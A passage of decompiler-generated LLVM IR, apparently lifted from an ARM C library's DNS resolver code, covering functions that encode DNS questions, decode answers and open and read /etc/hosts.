  %v2_19a78 = add i32 %arg2, 4
  %v3_19a78 = inttoptr i32 %v2_19a78 to i32*
  store i32 %v3_19a74, i32* %v3_19a78, align 4
  %v4_19a7c = load i8, i8* %v3_19a70, align 1
  %div = udiv i8 %v4_19a7c, 8
  %tmp5 = urem i8 %div, 16
  %v1_19a84 = zext i8 %tmp5 to i32
  %v2_19a88 = add i32 %arg2, 8
  %v3_19a88 = inttoptr i32 %v2_19a88 to i32*
  store i32 %v1_19a84, i32* %v3_19a88, align 4
  %v4_19a8c = load i8, i8* %v3_19a70, align 1
  %div1 = udiv i8 %v4_19a8c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_19a94 = zext i8 %tmp6 to i32
  %v2_19a98 = add i32 %arg2, 12
  %v3_19a98 = inttoptr i32 %v2_19a98 to i32*
  store i32 %v1_19a94, i32* %v3_19a98, align 4
  %v4_19a9c = load i8, i8* %v3_19a70, align 1
  %div2 = udiv i8 %v4_19a9c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_19aa4 = zext i8 %tmp7 to i32
  %v2_19aa8 = add i32 %arg2, 16
  %v3_19aa8 = inttoptr i32 %v2_19aa8 to i32*
  store i32 %v1_19aa4, i32* %v3_19aa8, align 4
  %v4_19aac = load i8, i8* %v3_19a70, align 1
  %tmp8 = urem i8 %v4_19aac, 2
  %v1_19ab0 = zext i8 %tmp8 to i32
  %v2_19ab4 = add i32 %arg2, 20
  %v3_19ab4 = inttoptr i32 %v2_19ab4 to i32*
  store i32 %v1_19ab0, i32* %v3_19ab4, align 4
  %v2_19ab8 = add i32 %tmp, 3
  %v3_19ab8 = inttoptr i32 %v2_19ab8 to i8*
  %v4_19ab8 = load i8, i8* %v3_19ab8, align 1
  %tmp9 = icmp slt i8 %v4_19ab8, 0
  %v3_19abc = zext i1 %tmp9 to i32
  %v2_19ac0 = add i32 %arg2, 24
  %v3_19ac0 = inttoptr i32 %v2_19ac0 to i32*
  store i32 %v3_19abc, i32* %v3_19ac0, align 4
  %v4_19ac4 = load i8, i8* %v3_19ab8, align 1
  %tmp10 = urem i8 %v4_19ac4, 16
  %v1_19ac8 = zext i8 %tmp10 to i32
  %v2_19acc = add i32 %arg2, 28
  %v3_19acc = inttoptr i32 %v2_19acc to i32*
  store i32 %v1_19ac8, i32* %v3_19acc, align 4
  %v2_19ad0 = add i32 %tmp, 4
  %v3_19ad0 = inttoptr i32 %v2_19ad0 to i8*
  %v4_19ad0 = load i8, i8* %v3_19ad0, align 1
  %v5_19ad0 = zext i8 %v4_19ad0 to i32
  %v2_19ad4 = add i32 %tmp, 5
  %v3_19ad4 = inttoptr i32 %v2_19ad4 to i8*
  %v4_19ad4 = load i8, i8* %v3_19ad4, align 1
  %v5_19ad4 = zext i8 %v4_19ad4 to i32
  %v4_19ad8 = mul nuw nsw i32 %v5_19ad0, 256
  %v5_19ad8 = or i32 %v5_19ad4, %v4_19ad8
  %v2_19adc = add i32 %arg2, 32
  %v3_19adc = inttoptr i32 %v2_19adc to i32*
  store i32 %v5_19ad8, i32* %v3_19adc, align 4
  %v2_19ae0 = add i32 %tmp, 6
  %v3_19ae0 = inttoptr i32 %v2_19ae0 to i8*
  %v4_19ae0 = load i8, i8* %v3_19ae0, align 1
  %v5_19ae0 = zext i8 %v4_19ae0 to i32
  %v2_19ae4 = add i32 %tmp, 7
  %v3_19ae4 = inttoptr i32 %v2_19ae4 to i8*
  %v4_19ae4 = load i8, i8* %v3_19ae4, align 1
  %v5_19ae4 = zext i8 %v4_19ae4 to i32
  %v4_19ae8 = mul nuw nsw i32 %v5_19ae0, 256
  %v5_19ae8 = or i32 %v5_19ae4, %v4_19ae8
  %v2_19aec = add i32 %arg2, 36
  %v3_19aec = inttoptr i32 %v2_19aec to i32*
  store i32 %v5_19ae8, i32* %v3_19aec, align 4
  %v2_19af0 = add i32 %tmp, 8
  %v3_19af0 = inttoptr i32 %v2_19af0 to i8*
  %v4_19af0 = load i8, i8* %v3_19af0, align 1
  %v5_19af0 = zext i8 %v4_19af0 to i32
  %v2_19af4 = add i32 %tmp, 9
  %v3_19af4 = inttoptr i32 %v2_19af4 to i8*
  %v4_19af4 = load i8, i8* %v3_19af4, align 1
  %v5_19af4 = zext i8 %v4_19af4 to i32
  %v4_19af8 = mul nuw nsw i32 %v5_19af0, 256
  %v5_19af8 = or i32 %v5_19af4, %v4_19af8
  %v2_19afc = add i32 %arg2, 40
  %v3_19afc = inttoptr i32 %v2_19afc to i32*
  store i32 %v5_19af8, i32* %v3_19afc, align 4
  %v2_19b00 = add i32 %tmp, 11
  %v3_19b00 = inttoptr i32 %v2_19b00 to i8*
  %v4_19b00 = load i8, i8* %v3_19b00, align 1
  %v5_19b00 = zext i8 %v4_19b00 to i32
  %v2_19b04 = add i32 %tmp, 10
  %v3_19b04 = inttoptr i32 %v2_19b04 to i8*
  %v4_19b04 = load i8, i8* %v3_19b04, align 1
  %v5_19b04 = zext i8 %v4_19b04 to i32
  %v4_19b0c = mul nuw nsw i32 %v5_19b04, 256
  %v5_19b0c = or i32 %v4_19b0c, %v5_19b00
  %v2_19b10 = add i32 %arg2, 44
  %v3_19b10 = inttoptr i32 %v2_19b10 to i32*
  store i32 %v5_19b0c, i32* %v3_19b10, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 11, { 21, 22, 6, 8, 9, 10, 15, 4, 5, 16, 17, 18, 19, 20, 0, 11, 12, 7, 3, 2, 1, 13, 14 }
  uselistorder i8 8, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_19b18 = load i32, i32* @r4, align 4
  store i32 %v3_19b18, i32* %stack_var_-16, align 4
  %v6_19b18 = load i32, i32* @r5, align 4
  %v9_19b18 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_19b20 = load i32, i32* %arg1, align 4
  store i32 %v2_19b20, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_19b2c = inttoptr i32 %v2_19b20 to i8*
  %v2_19b2c = call i32 @__encode_dotted(i8* %v1_19b2c)
  store i32 %v2_19b2c, i32* %r0.global-to-local, align 4
  %v1_19b30 = icmp slt i32 %v2_19b2c, 0
  br i1 %v1_19b30, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_19b38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_19b38, i32* @r4, align 4
  store i32 %v6_19b18, i32* @r5, align 4
  store i32 %v9_19b18, i32* @r6, align 4
  ret i32 %v2_19b2c

bb6:                                              ; preds = %entry
  %v1_19b34 = load i32, i32* @r4, align 4
  %v2_19b34 = sub i32 %v1_19b34, %v2_19b2c
  %v0_19b40 = load i32, i32* @r6, align 4
  %v2_19b40 = add i32 %v0_19b40, %v2_19b2c
  store i32 %v2_19b40, i32* %r2.global-to-local, align 4
  %v7_19b44 = icmp sgt i32 %v2_19b34, 3
  br i1 %v7_19b44, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_19b48 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_19b48, i32* @r4, align 4
  store i32 %v6_19b18, i32* @r5, align 4
  store i32 %v9_19b18, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_19b4c = load i32, i32* @r5, align 4
  %v1_19b4c = add i32 %v0_19b4c, 5
  %v2_19b4c = inttoptr i32 %v1_19b4c to i8*
  %v3_19b4c = load i8, i8* %v2_19b4c, align 1
  %v5_19b50 = inttoptr i32 %v2_19b40 to i8*
  store i8 %v3_19b4c, i8* %v5_19b50, align 1
  %v0_19b54 = load i32, i32* @r5, align 4
  %v1_19b54 = add i32 %v0_19b54, 4
  %v2_19b54 = inttoptr i32 %v1_19b54 to i32*
  %v3_19b54 = load i32, i32* %v2_19b54, align 4
  %v1_19b58 = trunc i32 %v3_19b54 to i8
  %v2_19b58 = load i32, i32* %r2.global-to-local, align 4
  %v3_19b58 = add i32 %v2_19b58, 1
  %v4_19b58 = inttoptr i32 %v3_19b58 to i8*
  store i8 %v1_19b58, i8* %v4_19b58, align 1
  %v0_19b5c = load i32, i32* @r5, align 4
  %v1_19b5c = add i32 %v0_19b5c, 9
  %v2_19b5c = inttoptr i32 %v1_19b5c to i8*
  %v3_19b5c = load i8, i8* %v2_19b5c, align 1
  %v2_19b60 = load i32, i32* %r2.global-to-local, align 4
  %v3_19b60 = add i32 %v2_19b60, 2
  %v4_19b60 = inttoptr i32 %v3_19b60 to i8*
  store i8 %v3_19b5c, i8* %v4_19b60, align 1
  %v0_19b64 = load i32, i32* @r5, align 4
  %v1_19b64 = add i32 %v0_19b64, 8
  %v2_19b64 = inttoptr i32 %v1_19b64 to i32*
  %v3_19b64 = load i32, i32* %v2_19b64, align 4
  %v0_19b68 = load i32, i32* %r0.global-to-local, align 4
  %v1_19b68 = add i32 %v0_19b68, 4
  store i32 %v1_19b68, i32* %r0.global-to-local, align 4
  %v1_19b6c = trunc i32 %v3_19b64 to i8
  %v2_19b6c = load i32, i32* %r2.global-to-local, align 4
  %v3_19b6c = add i32 %v2_19b6c, 3
  %v4_19b6c = inttoptr i32 %v3_19b6c to i8*
  store i8 %v1_19b6c, i8* %v4_19b6c, align 1
  %v2_19b70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_19b70, i32* @r4, align 4
  store i32 %v6_19b18, i32* @r5, align 4
  store i32 %v9_19b18, i32* @r6, align 4
  ret i32 %v1_19b68

; uselistorder directives
  uselistorder i32 %v2_19b2c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_19b18, { 1, 0, 2 }
  uselistorder i32 %v6_19b18, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_19b78 = call i32 @__length_dotted()
  %v1_19b7c = icmp slt i32 %v0_19b78, 0
  br i1 %v1_19b7c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_19b80 = add i32 %v0_19b78, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_19b84 = phi i32 [ %v0_19b78, %entry ], [ %v4_19b80, %bb ]
  ret i32 %v5_19b84

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_19b88 = load i32, i32* @r4, align 4
  %v6_19b88 = load i32, i32* @r5, align 4
  %v9_19b88 = load i32, i32* @r6, align 4
  %v12_19b88 = load i32, i32* @r7, align 4
  %v21_19b88 = load i32, i32* @sl, align 4
  %v2_19b8c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_19b8c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_19ba8 = call i32 @__decode_dotted()
  store i32 %v0_19ba8, i32* %r0.global-to-local, align 4
  store i32 %v0_19ba8, i32* @r7, align 4
  %v1_19bac = icmp slt i32 %v0_19ba8, 0
  %v0_19bb0 = load i32, i32* @r4, align 4
  %v2_19bb0 = add i32 %v0_19bb0, %v0_19ba8
  store i32 %v2_19bb0, i32* %r8.global-to-local, align 4
  br i1 %v1_19bac, label %bb14, label %dec_label_pc_19bc0

dec_label_pc_19bc0:                               ; preds = %entry
  %v1_19bb8 = load i32, i32* @r5, align 4
  %v2_19bb8 = sub i32 %v1_19bb8, %v2_19bb0
  %v1_19bc0 = add i32 %v2_19bb8, -10
  store i32 %v1_19bc0, i32* @r5, align 4
  %v6_19bc0 = icmp slt i32 %v1_19bc0, 0
  store i32 %v2_19b8c, i32* %r0.global-to-local, align 4
  %v0_19bc8 = load i32, i32* @sl, align 4
  %v2_19bc8 = add i32 %v0_19bc8, %v2_19bb0
  store i32 %v2_19bc8, i32* @r4, align 4
  br i1 %v6_19bc0, label %bb, label %dec_label_pc_19bd4

bb:                                               ; preds = %dec_label_pc_19bc0
  br label %bb14

dec_label_pc_19bd4:                               ; preds = %dec_label_pc_19bc0
  %v1_19bd4 = bitcast i32* %stack_var_-288 to i8*
  %v2_19bd4 = call i32 @__GI_strdup(i8* %v1_19bd4)
  store i32 %v2_19bd4, i32* %r0.global-to-local, align 4
  %v1_19bd8 = load i32, i32* @r6, align 4
  %v2_19bd8 = inttoptr i32 %v1_19bd8 to i32*
  store i32 %v2_19bd4, i32* %v2_19bd8, align 4
  %v0_19bdc = load i32, i32* @sl, align 4
  %v1_19bdc = load i32, i32* %r8.global-to-local, align 4
  %v2_19bdc = add i32 %v1_19bdc, %v0_19bdc
  %v3_19bdc = inttoptr i32 %v2_19bdc to i8*
  %v4_19bdc = load i8, i8* %v3_19bdc, align 1
  %v6_19bdc = zext i8 %v4_19bdc to i32
  %v0_19be0 = load i32, i32* @r4, align 4
  %v1_19be0 = add i32 %v0_19be0, 1
  %v2_19be0 = inttoptr i32 %v1_19be0 to i8*
  %v3_19be0 = load i8, i8* %v2_19be0, align 1
  %v4_19be0 = zext i8 %v3_19be0 to i32
  %v4_19be4 = mul nuw nsw i32 %v6_19bdc, 256
  %v5_19be4 = or i32 %v4_19be0, %v4_19be4
  store i32 %v5_19be4, i32* %r3.global-to-local, align 4
  %v1_19be8 = load i32, i32* @r6, align 4
  %v2_19be8 = add i32 %v1_19be8, 4
  %v3_19be8 = inttoptr i32 %v2_19be8 to i32*
  store i32 %v5_19be4, i32* %v3_19be8, align 4
  %v0_19bec = load i32, i32* @r4, align 4
  %v1_19bec = add i32 %v0_19bec, 2
  store i32 %v1_19bec, i32* %r1.global-to-local, align 4
  %v2_19bf0 = inttoptr i32 %v1_19bec to i8*
  %v3_19bf0 = load i8, i8* %v2_19bf0, align 1
  %v4_19bf0 = zext i8 %v3_19bf0 to i32
  %v1_19bf4 = add i32 %v0_19bec, 3
  %v2_19bf4 = inttoptr i32 %v1_19bf4 to i8*
  %v3_19bf4 = load i8, i8* %v2_19bf4, align 1
  %v4_19bf4 = zext i8 %v3_19bf4 to i32
  %v4_19bf8 = mul nuw nsw i32 %v4_19bf0, 256
  %v5_19bf8 = or i32 %v4_19bf4, %v4_19bf8
  store i32 %v5_19bf8, i32* %r3.global-to-local, align 4
  %v1_19bfc = load i32, i32* @r6, align 4
  %v2_19bfc = add i32 %v1_19bfc, 8
  %v3_19bfc = inttoptr i32 %v2_19bfc to i32*
  store i32 %v5_19bf8, i32* %v3_19bfc, align 4
  %v0_19c00 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c00 = add i32 %v0_19c00, 2
  %v1_19c04 = add i32 %v0_19c00, 3
  %v2_19c04 = inttoptr i32 %v1_19c04 to i8*
  %v3_19c04 = load i8, i8* %v2_19c04, align 1
  %v4_19c04 = zext i8 %v3_19c04 to i32
  store i32 %v4_19c04, i32* %r3.global-to-local, align 4
  %v2_19c08 = inttoptr i32 %v1_19c00 to i8*
  %v3_19c08 = load i8, i8* %v2_19c08, align 1
  %v4_19c08 = zext i8 %v3_19c08 to i32
  store i32 %v4_19c08, i32* %r0.global-to-local, align 4
  %v1_19c0c = add i32 %v0_19c00, 5
  %v2_19c0c = inttoptr i32 %v1_19c0c to i8*
  %v3_19c0c = load i8, i8* %v2_19c0c, align 1
  %v4_19c0c = zext i8 %v3_19c0c to i32
  %v3_19c10 = mul nuw nsw i32 %v4_19c04, 65536
  store i32 %v3_19c10, i32* %r3.global-to-local, align 4
  %v1_19c14 = add i32 %v0_19c00, 4
  %v2_19c14 = inttoptr i32 %v1_19c14 to i8*
  %v3_19c14 = load i8, i8* %v2_19c14, align 1
  %v4_19c14 = zext i8 %v3_19c14 to i32
  %v4_19c18 = mul nuw i32 %v4_19c08, 16777216
  %v5_19c18 = or i32 %v4_19c18, %v3_19c10
  %v2_19c1c = or i32 %v5_19c18, %v4_19c0c
  %v4_19c20 = mul nuw nsw i32 %v4_19c14, 256
  %v5_19c20 = or i32 %v2_19c1c, %v4_19c20
  store i32 %v5_19c20, i32* %r3.global-to-local, align 4
  %v1_19c24 = load i32, i32* @r6, align 4
  %v2_19c24 = add i32 %v1_19c24, 12
  %v3_19c24 = inttoptr i32 %v2_19c24 to i32*
  store i32 %v5_19c20, i32* %v3_19c24, align 4
  %v0_19c28 = load i32, i32* %r1.global-to-local, align 4
  %v1_19c28 = add i32 %v0_19c28, 6
  %v2_19c28 = inttoptr i32 %v1_19c28 to i8*
  %v3_19c28 = load i8, i8* %v2_19c28, align 1
  %v4_19c28 = zext i8 %v3_19c28 to i32
  %v0_19c2c = load i32, i32* @r4, align 4
  %v1_19c2c = add i32 %v0_19c2c, 9
  %v2_19c2c = inttoptr i32 %v1_19c2c to i8*
  %v3_19c2c = load i8, i8* %v2_19c2c, align 1
  %v4_19c2c = zext i8 %v3_19c2c to i32
  %v1_19c30 = add i32 %v0_19c2c, 10
  store i32 %v1_19c30, i32* %r0.global-to-local, align 4
  %v4_19c34 = mul nuw nsw i32 %v4_19c28, 256
  %v5_19c34 = or i32 %v4_19c2c, %v4_19c34
  store i32 %v5_19c34, i32* %r3.global-to-local, align 4
  %v0_19c38 = load i32, i32* %r8.global-to-local, align 4
  %v1_19c38 = add i32 %v0_19c38, 10
  %v0_19c3c = load i32, i32* @r5, align 4
  %v1_19c40 = add nuw nsw i32 %v5_19c34, 10
  store i32 %v1_19c40, i32* %r1.global-to-local, align 4
  %v1_19c44 = load i32, i32* @r6, align 4
  %v2_19c44 = add i32 %v1_19c44, 24
  %v3_19c44 = inttoptr i32 %v2_19c44 to i32*
  store i32 %v1_19c38, i32* %v3_19c44, align 4
  %v0_19c48 = load i32, i32* %r0.global-to-local, align 4
  %v1_19c48 = load i32, i32* @r6, align 4
  %v2_19c48 = add i32 %v1_19c48, 20
  %v3_19c48 = inttoptr i32 %v2_19c48 to i32*
  store i32 %v0_19c48, i32* %v3_19c48, align 4
  %v0_19c4c = load i32, i32* %r3.global-to-local, align 4
  %v1_19c4c = load i32, i32* @r6, align 4
  %v2_19c4c = add i32 %v1_19c4c, 16
  %v3_19c4c = inttoptr i32 %v2_19c4c to i32*
  store i32 %v0_19c4c, i32* %v3_19c4c, align 4
  %v0_19c50 = load i32, i32* @r7, align 4
  %v1_19c50 = load i32, i32* %r1.global-to-local, align 4
  %v2_19c50 = add i32 %v1_19c50, %v0_19c50
  %v5_19c54 = icmp slt i32 %v0_19c3c, %v5_19c34
  %.v2_19c50 = select i1 %v5_19c54, i32 -1, i32 %v2_19c50
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_19bd4, %entry
  %v0_19c58 = phi i32 [ %.v2_19c50, %dec_label_pc_19bd4 ], [ %v1_19bc0, %bb ], [ %v0_19ba8, %entry ]
  store i32 %v0_19c58, i32* %r0.global-to-local, align 4
  store i32 %v3_19b88, i32* @r4, align 4
  store i32 %v6_19b88, i32* @r5, align 4
  store i32 %v9_19b88, i32* @r6, align 4
  store i32 %v12_19b88, i32* @r7, align 4
  store i32 %v21_19b88, i32* @sl, align 4
  ret i32 %v0_19c58

; uselistorder directives
  uselistorder i32 %v0_19c58, { 1, 0 }
  uselistorder i32 %v5_19c34, { 1, 0, 2 }
  uselistorder i32 %v3_19c10, { 1, 0 }
  uselistorder i32 %v1_19bc0, { 0, 2, 1 }
  uselistorder i32 %v0_19ba8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 5, { 3, 23, 24, 25, 13, 7, 4, 14, 15, 8, 16, 5, 0, 1, 6, 2, 21, 22, 9, 17, 10, 12, 11, 18, 19, 20 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20f28.1303 to i32), i32* @r1, align 4
  %v0_19c68 = load i32, i32* @lr, align 4
  store i32 %v0_19c68, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_20f8c.1386 to i32), i32* @r0, align 4
  %v3_19c70 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_20f8c.1386 to i32), i32 ptrtoint (i32* @global_var_20f28.1303 to i32))
  %v2_19c74 = icmp eq i32 %v3_19c70, 0
  store i32 ptrtoint (i32* @global_var_20f28.1303 to i32), i32* @r1, align 4
  br i1 %v2_19c74, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_19c70

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_20f98.1388 to i32), i32* @r0, align 4
  %v2_19c84 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_19c84, i32* @lr, align 4
  %v3_19c88 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_20f98.1388 to i32), i32 ptrtoint (i32* @global_var_20f28.1303 to i32))
  ret i32 %v3_19c88

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0 }
  uselistorder i32 114, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_20f28.1303 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_19c98 = load i32, i32* @r4, align 4
  %v6_19c98 = load i32, i32* @r5, align 4
  %v12_19c98 = load i32, i32* @r7, align 4
  %v15_19c98 = load i32, i32* @r8, align 4
  %v21_19c98 = load i32, i32* @sl, align 4
  %v24_19c98 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_19ca4 = sub i32 0, %tmp61
  %v1_19ca8 = urem i32 %v1_19ca4, 4
  store i32 %v1_19ca8, i32* %ip.global-to-local, align 4
  %v2_19ca8 = icmp eq i32 %v1_19ca8, 0
  %v0_19cac = load i32, i32* @r2, align 4
  %v0_19cb0 = load i32, i32* @r0, align 4
  %v0_19cb4 = load i32, i32* @r1, align 4
  %v0_19cb8 = load i32, i32* @r3, align 4
  store i32 %v0_19cb8, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_19ca8, label %dec_label_pc_19cd8, label %dec_label_pc_19cc8

dec_label_pc_19cc8:                               ; preds = %entry
  %v2_19cc8 = sub i32 %tmp57, %v1_19ca8
  %v3_19cc8 = icmp ult i32 %tmp57, %v1_19ca8
  br i1 %v3_19cc8, label %dec_label_pc_19fac, label %dec_label_pc_19cd0

dec_label_pc_19cd0:                               ; preds = %dec_label_pc_19cc8
  store i32 %v2_19cc8, i32* %r2.global-to-local, align 4
  %v2_19cd4 = add i32 %v1_19ca8, %tmp61
  store i32 %v2_19cd4, i32* @r4, align 4
  br label %dec_label_pc_19cd8

dec_label_pc_19cd8:                               ; preds = %entry, %dec_label_pc_19cd0
  %v0_19ce8 = phi i32 [ %tmp61, %entry ], [ %v2_19cd4, %dec_label_pc_19cd0 ]
  %v0_19cec = phi i32 [ %tmp57, %entry ], [ %v2_19cc8, %dec_label_pc_19cd0 ]
  %tmp = icmp ult i32 %v0_19cec, 32
  br i1 %tmp, label %dec_label_pc_19fac, label %dec_label_pc_19ce0

dec_label_pc_19ce0:                               ; preds = %dec_label_pc_19cd8
  store i32 %v0_19cb8, i32* %r0.global-to-local, align 4
  %v7_19ce4 = icmp eq i32 %v0_19cb8, 1
  %v1_19ce8 = add i32 %v0_19ce8, 32
  store i32 %v1_19ce8, i32* @fp, align 4
  %v1_19cec = add i32 %v0_19cec, -32
  store i32 %v1_19cec, i32* @r8, align 4
  br i1 %v7_19ce4, label %dec_label_pc_19e18, label %dec_label_pc_19cf4

dec_label_pc_19cf4:                               ; preds = %dec_label_pc_19ce0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_19d00 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_19d00, align 4
  %tmp80 = icmp ult i32 %v1_19cec, 4
  br i1 %tmp80, label %dec_label_pc_19fac, label %dec_label_pc_19d08

dec_label_pc_19d08:                               ; preds = %dec_label_pc_19cf4
  %v0_19d08 = load i32, i32* %r2.global-to-local, align 4
  %v1_19d08 = add i32 %v0_19d08, -36
  store i32 %v1_19d08, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_19d08, 8
  br i1 %tmp81, label %dec_label_pc_19fac, label %dec_label_pc_19d14

dec_label_pc_19d14:                               ; preds = %dec_label_pc_19d08
  %v0_19d14 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_19d14, 16
  br i1 %tmp82, label %dec_label_pc_19fac, label %dec_label_pc_19d1c

dec_label_pc_19d1c:                               ; preds = %dec_label_pc_19d14
  %v1_19d1c = add i32 %v0_19d08, -48
  store i32 %v1_19d1c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_19d1c, 8
  br i1 %tmp83, label %dec_label_pc_19fac, label %dec_label_pc_19d28

dec_label_pc_19d28:                               ; preds = %dec_label_pc_19d1c
  %v1_19d28 = add i32 %v0_19d08, -44
  store i32 %v1_19d28, i32* @r8, align 4
  %v1_19d2c = add i32 %v0_19d08, -56
  store i32 %v1_19d2c, i32* %r3.global-to-local, align 4
  %v3_19d30 = icmp ult i32 %v1_19d2c, %v1_19d28
  br i1 %v3_19d30, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_19d28
  %v1_19d38 = load i32, i32* @r4, align 4
  %v2_19d38 = add i32 %v1_19d38, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_19d28
  store i32 %v1_19d2c, i32* @r8, align 4
  %v1_19d3c.pre = load i32, i32* @r4, align 4
  %v2_19d3c = add i32 %v1_19d3c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_19d3c, %.thread1 ], [ %v2_19d38, %bb ]
  %v0_19d44 = phi i32 [ %v1_19d3c.pre, %.thread1 ], [ %v1_19d38, %bb ]
  %v0_19d40 = phi i32 [ %v1_19d2c, %.thread1 ], [ %v1_19d28, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_19d44 = add i32 %v0_19d44, 36
  store i32 %v1_19d44, i32* @r6, align 4
  %v1_19d48 = add i32 %v0_19d44, 48
  store i32 %v1_19d48, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_19d40, 80
  br i1 %tmp84, label %dec_label_pc_19fac, label %dec_label_pc_19d50

dec_label_pc_19d50:                               ; preds = %bb74
  %v0_19d50 = call i32 @__open_etc_hosts()
  store i32 %v0_19d50, i32* %r0.global-to-local, align 4
  %v2_19d54 = icmp eq i32 %v0_19d50, 0
  br i1 %v2_19d54, label %dec_label_pc_19d70, label %.thread

.thread:                                          ; preds = %dec_label_pc_19d50
  %v1_19d5c = load i32, i32* @fp, align 4
  store i32 %v1_19d5c, i32* @r7, align 4
  %v1_19d60 = load i32, i32* @r5, align 4
  store i32 %v1_19d60, i32* @fp, align 4
  %v1_19d64 = load i32, i32* @r6, align 4
  %v1_19d68 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_19e24

dec_label_pc_19d70:                               ; preds = %dec_label_pc_19d50
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_19d78 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_19d78, align 4
  %v0_19d7c = call i32 @__errno_location()
  store i32 %v0_19d7c, i32* %r0.global-to-local, align 4
  %v1_19d80 = inttoptr i32 %v0_19d7c to i32*
  %v2_19d80 = load i32, i32* %v1_19d80, align 4
  store i32 %v2_19d80, i32* @sl, align 4
  br label %dec_label_pc_19fb0

dec_label_pc_19d88:                               ; preds = %dec_label_pc_19f38
  %v0_19d88 = load i32, i32* @r4, align 4
  %v1_19d88 = add i32 %v0_19d88, 4
  %v2_19d88 = inttoptr i32 %v1_19d88 to i32*
